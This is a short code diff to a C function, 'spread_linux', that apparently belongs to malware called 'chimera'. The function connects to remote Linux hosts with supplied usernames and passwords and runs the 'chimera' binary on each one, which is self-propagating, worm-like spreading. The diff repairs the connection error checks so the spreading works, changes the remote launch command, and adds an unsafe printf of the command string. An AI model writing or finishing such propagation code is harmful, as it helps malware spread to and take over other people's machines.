@@ -84,7 +84,7 @@ void spread_linux(const char* host, const char* username, const char* password) 
         return;
     }
 
-    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
         return;
     }
 
@@ -95,18 +95,19 @@ void spread_linux(const char* host, const char* username, const char* password) 
         return;
     }
 
-    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
         return;
     }
 
     // Run the command on the remote Linux machine
-    ret = snprintf(command_string, sizeof(command_string), "./chimera");
+    ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera");
     if (ret >= sizeof(command_string)) {
         fprintf(stderr, "Command string too long\n");
         return;
     }
 
-    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
+    printf(command_string);
+    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
         return;
     }
 
